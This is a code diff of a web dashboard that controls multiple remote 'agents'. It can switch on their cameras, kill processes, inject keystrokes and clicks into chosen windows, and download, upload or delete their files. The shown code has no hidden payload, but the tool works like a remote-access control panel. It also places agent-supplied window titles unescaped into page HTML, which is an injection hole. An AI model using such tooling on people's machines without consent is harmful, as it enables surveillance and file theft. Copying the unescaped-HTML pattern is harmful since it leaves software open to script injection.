   if (!confirm(`Kill PID ${pid}?`)) return;
-  const r = await fetch("/processes/kill", { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({pid}) });
-  const d = await r.json();
-  if (d.ok) loadProcs();
+  socket.emit("kill_process", { pid, _target: selectedAgent });
+  setTimeout(loadProcs, 500);
+}
+
+// ── Camera ────────────────────────────────────────────────────────────────────
+socket.on("camera_frame", d => { if (cameraActive && d._agent === selectedAgent) camFeed.src = "data:image/jpeg;base64," + d.data; });
+function toggleCamera() {
+  if (!selectedAgent) return;
+  if (cameraActive) {
+    socket.emit("camera_off", { _target: selectedAgent });
+    updateCamUI(false);
+  } else {
+    socket.emit("camera_on", { _target: selectedAgent });
+    updateCamUI(true);
+  }
+}
+function updateCamUI(active) {
+  cameraActive = active;
+  camBtn.textContent = active ? "📷 Camera ON" : "📷 Camera";
+  camBtn.className = active ? "topbar-btn active" : "topbar-btn";
+  camPanel.className = active ? "visible" : "";
+  camFeed.style.display = active ? "block" : "none";
+  if (!active) { camFeed.src = ""; camPlaceholder.style.display = "block"; camPlaceholder.textContent = "Camera off"; }
+  else camPlaceholder.style.display = "none";
 }
 
 // ── Recording ─────────────────────────────────────────────────────────────────
 let mediaRecorder = null, fileWriter = null, recSeconds = 0, recInterval = null;
 const hasFSA = typeof window.showSaveFilePicker === "function";
-if (!hasFSA) noFsaMsg.style.display = "block";
-
 async function toggleRecord() {
-  if (!hasFSA) return;
+  if (!hasFSA) { alert("Use Chrome or Edge to record."); return; }
   if (mediaRecorder && mediaRecorder.state === "recording") { mediaRecorder.stop(); return; }
   try {
     const ts = new Date().toISOString().replace(/[:.]/g,"-").slice(0,19);
-    const handle = await window.showSaveFilePicker({
-      suggestedName: `nora_${ts}.webm`,
-      types: [{ description:"WebM Video", accept:{"video/webm":[".webm"]} }],
-    });
+    const handle = await window.showSaveFilePicker({ suggestedName: `nora_${ts}.webm`, types:[{description:"WebM Video",accept:{"video/webm":[".webm"]}}] });
     fileWriter = await handle.createWritable();
     const stream = canvas.captureStream(12);
     const mime = MediaRecorder.isTypeSupported("video/webm;codecs=vp9") ? "video/webm;codecs=vp9" : "video/webm";
@@ -415,47 +698,269 @@ async function toggleRecord() {
   } catch(e) {}
 }
 
-// ── Camera ────────────────────────────────────────────────────────────────────
-socket.on("camera_frame", d => { if (cameraActive) camFeed.src = "data:image/jpeg;base64," + d.data; });
-socket.on("camera_state", d => updateCamUI(d.active));
-async function toggleCamera() {
-  const r = await fetch(cameraActive ? "/camera/stop" : "/camera/start", { method:"POST" });
-  const d = await r.json();
-  if (!d.ok && !cameraActive) camPlaceholder.textContent = "No camera found";
-}
-function updateCamUI(active) {
-  cameraActive = active;
-  camBtn.textContent = active ? "📷 Camera ON" : "📷 Camera";
-  camBtn.className = active ? "topbar-btn active" : "topbar-btn";
-  camPanel.className = active ? "visible" : "";
-  camFeed.style.display = active ? "block" : "none";
-  if (!active) { camFeed.src = ""; camPlaceholder.style.display = "block"; camPlaceholder.textContent = "Camera off"; }
-  else camPlaceholder.style.display = "none";
-}
-
 // ── Remote control ────────────────────────────────────────────────────────────
-function controlActive() { return ctrlToggle.checked; }
+function controlActive() { return ctrlToggle.checked && !!selectedAgent; }
+function cmd(data) { if (controlActive()) socket.emit("command", { ...data, _target: selectedAgent }); }
+
 screenPanel.addEventListener("mousemove", e => {
   const r = canvas.getBoundingClientRect();
+  const pr = screenPanel.getBoundingClientRect();
   const x = e.clientX - r.left, y = e.clientY - r.top;
-  cursorEl.style.left = (x + r.left) + "px"; cursorEl.style.top = (y + r.top) + "px"; cursorEl.style.display = "block";
-  if (!controlActive()) return;
-  socket.emit("command", { action:"mousemove", x:Math.max(0,x), y:Math.max(0,y), sw:r.width, sh:r.height });
+  if (x < 0 || y < 0 || x > r.width || y > r.height) { cursorEl.style.display = "none"; return; }
+  cursorEl.style.left = (r.left - pr.left + x) + "px";
+  cursorEl.style.top  = (r.top  - pr.top  + y) + "px";
+  cursorEl.style.display = "block";
+  cmd({ action:"mousemove", x, y, sw:r.width, sh:r.height });
 });
 screenPanel.addEventListener("mouseleave", () => { cursorEl.style.display = "none"; });
-screenPanel.addEventListener("mousedown",  e => { if (!controlActive()) return; socket.emit("command", { action:"mousedown", button:e.button }); });
-screenPanel.addEventListener("mouseup",    e => { if (!controlActive()) return; socket.emit("command", { action:"mouseup",   button:e.button }); });
+screenPanel.addEventListener("mousedown",  e => { const r = canvas.getBoundingClientRect(); if (e.clientX>=r.left&&e.clientX<=r.right&&e.clientY>=r.top&&e.clientY<=r.bottom) cmd({ action:"mousedown", button:e.button }); });
+screenPanel.addEventListener("mouseup",    e => { const r = canvas.getBoundingClientRect(); if (e.clientX>=r.left&&e.clientX<=r.right&&e.clientY>=r.top&&e.clientY<=r.bottom) cmd({ action:"mouseup",   button:e.button }); });
 screenPanel.addEventListener("contextmenu",e => e.preventDefault());
-screenPanel.addEventListener("wheel",      e => { if (!controlActive()) return; socket.emit("command", { action:"scroll", delta:e.deltaY<0?3:-3 }); });
+screenPanel.addEventListener("wheel",      e => cmd({ action:"scroll", delta:e.deltaY<0?3:-3 }));
 document.addEventListener("keydown", e => {
   if (e.ctrlKey && e.shiftKey && e.key === "D") { ctrlToggle.checked = !ctrlToggle.checked; return; }
   if (!controlActive() || document.activeElement !== document.body) return;
-  e.preventDefault(); socket.emit("command", { action:"keydown", key:e.key });
+  e.preventDefault(); cmd({ action:"keydown", key:e.key });
 });
 document.addEventListener("keyup", e => {
   if (!controlActive() || document.activeElement !== document.body) return;
-  e.preventDefault(); socket.emit("command", { action:"keyup", key:e.key });
+  e.preventDefault(); cmd({ action:"keyup", key:e.key });
 });
+
+// ── Remote Keyboard window ───────────────────────────────────────────────────
+const kbdWindow  = document.getElementById("kbd-window");
+const kbdBox     = document.getElementById("kbd-box");
+const kbdDot     = document.getElementById("kbd-dot");
+const kbdLast    = document.getElementById("kbd-last");
+let kbdOpen = false;
+
+function toggleKbd() {
+  kbdOpen = !kbdOpen;
+  kbdWindow.style.display = kbdOpen ? "block" : "none";
+  if (kbdOpen) { kbdBox.value = ""; kbdBox.focus(); }
+}
+
+kbdBox.addEventListener("keydown", e => {
+  if (!selectedAgent) { kbdLast.textContent = "⚠ No agent selected"; return; }
+  e.preventDefault(); e.stopPropagation();
+  const display = e.key.length === 1 ? e.key : `[${e.key}]`;
+  if (targetHwnd) {
+    socket.emit("win_key", { hwnd: targetHwnd, key: e.key, _target: selectedAgent });
+    kbdLast.textContent = "→ " + targetTitle.substring(0, 20) + ": " + display;
+  } else if (controlActive()) {
+    cmd({ action: "keydown", key: e.key });
+    kbdLast.textContent = "Sent: " + display;
+  } else {
+    kbdLast.textContent = "⚠ Enable Remote Control first"; return;
+  }
+  kbdDot.classList.add("active");
+  clearTimeout(kbdBox._dotTimer);
+  kbdBox._dotTimer = setTimeout(() => kbdDot.classList.remove("active"), 200);
+  setTimeout(() => { kbdBox.value = ""; }, 0);
+});
+
+kbdBox.addEventListener("keyup", e => {
+  e.preventDefault(); e.stopPropagation();
+  if (targetHwnd) return;
+  if (!controlActive()) return;
+  cmd({ action: "keyup", key: e.key });
+});
+
+// Drag to move the keyboard window
+let _kx=0,_ky=0,_kl=0,_kt=0;
+function kbdDragStart(e) {
+  const r = kbdWindow.getBoundingClientRect();
+  _kx = e.clientX; _ky = e.clientY; _kl = r.left; _kt = r.top;
+  kbdWindow.style.transform = "none";
+  kbdWindow.style.left = _kl + "px"; kbdWindow.style.top = _kt + "px";
+  document.addEventListener("mousemove", kbdDragMove);
+  document.addEventListener("mouseup", kbdDragEnd, {once:true});
+}
+function kbdDragMove(e) {
+  kbdWindow.style.left = (_kl + e.clientX - _kx) + "px";
+  kbdWindow.style.top  = (_kt + e.clientY - _ky) + "px";
+}
+function kbdDragEnd() { document.removeEventListener("mousemove", kbdDragMove); }
+
+// ── Desktop & window control ─────────────────────────────────────────────────
+let targetHwnd = null;   // HWND of the PostMessage target window
+let targetTitle = "";
+
+function desktopCmd(cmd) {
+  if (!selectedAgent) return;
+  socket.emit("desktop_cmd", { cmd, _target: selectedAgent });
+}
+
+function openWinPicker() {
+  if (!selectedAgent) return;
+  document.getElementById("win-modal").style.display = "block";
+  document.getElementById("win-list").innerHTML = '<div style="padding:14px;color:#555;font-size:11px;">Loading…</div>';
+  socket.emit("list_windows", { _target: selectedAgent });
+}
+
+function closeWinPicker() {
+  document.getElementById("win-modal").style.display = "none";
+}
+
+function clearWinTarget() {
+  targetHwnd = null; targetTitle = "";
+  document.getElementById("win-target-label").style.display = "none";
+  document.getElementById("win-target-title").textContent = "—";
+  closeWinPicker();
+}
+
+socket.on("windows_list", data => {
+  const list = document.getElementById("win-list");
+  const wins = (data.windows || []).filter(w => w.title.trim());
+  if (!wins.length) { list.innerHTML = '<div style="padding:14px;color:#555;font-size:11px;">No windows found</div>'; return; }
+  list.innerHTML = wins.map(w =>
+    `<div class="win-row${targetHwnd===w.hwnd?' selected':''}" onclick="selectWin(${w.hwnd},${JSON.stringify(w.title)})">
+      <span style="flex:1">${w.title.substring(0,50)}</span>
+      <span class="win-hwnd">#${w.hwnd}</span>
+    </div>`
+  ).join("");
+});
+
+function selectWin(hwnd, title) {
+  targetHwnd = hwnd; targetTitle = title;
+  const lbl = document.getElementById("win-target-label");
+  document.getElementById("win-target-title").textContent = title.substring(0, 40);
+  lbl.style.display = "block";
+  closeWinPicker();
+}
+
+// PostMessage mouse: when target window selected, clicks on canvas go to target
+screenPanel.addEventListener("click", e => {
+  if (!targetHwnd || !selectedAgent) return;
+  const r = canvas.getBoundingClientRect();
+  if (e.clientX < r.left || e.clientX > r.right || e.clientY < r.top || e.clientY > r.bottom) return;
+  e.stopImmediatePropagation();
+  const x = e.clientX - r.left, y = e.clientY - r.top;
+  socket.emit("win_mouse", {
+    hwnd: targetHwnd, x, y, sw: r.width, sh: r.height,
+    action: "click", button: e.button, _target: selectedAgent
+  });
+}, true);
+
+// ── Sidebar toggle (mobile) ───────────────────────────────────────────────────
+function toggleSidebar() {
+  document.getElementById("sidebar").classList.toggle("collapsed");
+}
+
+// ── File Manager ──────────────────────────────────────────────────────────────
+let fmCurPath = null;
+const fmList  = document.getElementById("fm-list");
+const fmBread = document.getElementById("fm-breadcrumb");
+
+function fmSetStatus(msg) { fmList.innerHTML = `<div id="fm-status">${escHtml(msg)}</div>`; }
+
+function fmLoadDir(path) {
+  if (!selectedAgent) { fmSetStatus("No agent selected"); return; }
+  fmSetStatus("Loading…");
+  socket.emit("list_dir", { path: path || null, _target: selectedAgent });
+}
+
+socket.on("dir_result", d => {
+  if (!d) return;
+  fmCurPath = d.path;
+  fmBread.textContent = d.path;
+  if (d.error) { fmSetStatus("Error: " + d.error); return; }
+  const files = d.files || [];
+  if (!files.length) { fmList.innerHTML = '<div id="fm-status">Empty directory</div>'; return; }
+  fmList.innerHTML = files.map(f => {
+    const icon = f.type === "dir" ? "📁" : "📄";
+    const size = f.type === "file" ? fmFmtSize(f.size) : "";
+    const nameAttr = escAttr(d.path + "/" + f.name);
+    const nameAttrPath = escAttr(d.path.replace(/\\/g,"/") + "/" + f.name);
+    const actions = f.type === "file"
+      ? `<div class="fm-actions">
+           <button class="fm-dl-btn" onclick="event.stopPropagation();fmDownload('${nameAttr}','${escAttr(f.name)}')">DL</button>
+           <button class="fm-del-btn" onclick="event.stopPropagation();fmDelete('${nameAttr}')">Del</button>
+         </div>`
+      : `<div class="fm-actions"><button class="fm-del-btn" onclick="event.stopPropagation();fmDelete('${nameAttr}')">Del</button></div>`;
+    const onclick = f.type === "dir" ? `fmLoadDir('${nameAttrPath}')` : `fmDownload('${nameAttr}','${escAttr(f.name)}')`;
+    return `<div class="fm-row" onclick="${onclick}">
+      <span class="fm-icon">${icon}</span>
+      <span class="fm-name" title="${escAttr(f.name)}">${escHtml(f.name)}</span>
+      <span class="fm-meta">${escHtml(size)}</span>
+      ${actions}
+    </div>`;
+  }).join("");
+});
+
+function fmUp() {
+  if (!fmCurPath) return;
+  const parts = fmCurPath.replace(/\\/g,"/").split("/").filter(Boolean);
+  if (parts.length <= 1) { fmLoadDir("/"); return; }
+  parts.pop();
+  fmLoadDir("/" + parts.join("/"));
+}
+
+function fmDownload(path, name) {
+  if (!selectedAgent) return;
+  fmSetStatus("Downloading " + name + "…");
+  socket.emit("read_file", { path, _target: selectedAgent });
+}
+
+socket.on("file_data", d => {
+  if (!d) return;
+  if (d.error) { fmSetStatus("Error: " + d.error); return; }
+  try {
+    const binary = atob(d.data);
+    const bytes = new Uint8Array(binary.length);
+    for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
+    const blob = new Blob([bytes]);
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement("a");
+    a.href = url; a.download = d.name || "file";
+    document.body.appendChild(a); a.click();
+    document.body.removeChild(a); URL.revokeObjectURL(url);
+  } catch(e) { fmSetStatus("Download failed"); return; }
+  fmLoadDir(fmCurPath);
+});
+
+function fmDelete(path) {
+  if (!selectedAgent) return;
+  if (!confirm("Delete:\n" + path + "\n\nThis cannot be undone.")) return;
+  socket.emit("delete_path", { path, _target: selectedAgent });
+}
+
+socket.on("delete_result", d => {
+  if (!d) return;
+  if (!d.ok) { alert("Delete failed: " + (d.error || "unknown error")); }
+  fmLoadDir(fmCurPath);
+});
+
+function fmUpload(input) {
+  if (!selectedAgent || !input.files.length) return;
+  Array.from(input.files).forEach(file => {
+    const reader = new FileReader();
+    reader.onload = e => {
+      const b64 = btoa(String.fromCharCode(...new Uint8Array(e.target.result)));
+      const destPath = (fmCurPath || "").replace(/\\/g,"/").replace(/\/+$/,"") + "/" + file.name;
+      socket.emit("write_file", { path: destPath, data: b64, _target: selectedAgent });
+    };
+    reader.readAsArrayBuffer(file);
+  });
+  input.value = "";
+}
+
+socket.on("write_result", d => {
+  if (!d) return;
+  if (!d.ok) { alert("Upload failed: " + (d.error || "unknown error")); return; }
+  fmLoadDir(fmCurPath);
+});
+
+function fmFmtSize(b) {
+  if (b < 1024) return b + " B";
+  if (b < 1048576) return (b/1024).toFixed(1) + " KB";
+  if (b < 1073741824) return (b/1048576).toFixed(1) + " MB";
+  return (b/1073741824).toFixed(1) + " GB";
+}
+
+// ── Helpers ───────────────────────────────────────────────────────────────────
+function escHtml(s) { return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;"); }
+function escAttr(s) { return String(s).replace(/"/g,"&quot;").replace(/'/g,"&#39;"); }
 </script>
 </body>
 </html>
